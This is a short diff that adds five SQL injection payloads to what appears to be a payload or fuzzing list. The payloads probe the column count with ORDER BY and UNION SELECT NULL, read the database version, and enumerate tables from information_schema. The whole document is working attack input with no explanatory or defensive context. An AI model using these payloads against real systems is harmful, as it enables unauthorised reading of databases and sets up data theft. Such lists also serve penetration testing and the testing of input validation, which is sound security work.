@@ -1,0 +1,5 @@
+' ORDER BY 1--
+' UNION SELECT NULL--
+' UNION SELECT NULL FROM DUAL--
+' UNION SELECT @@version--
+' UNION SELECT table_name FROM information_schema.tables--
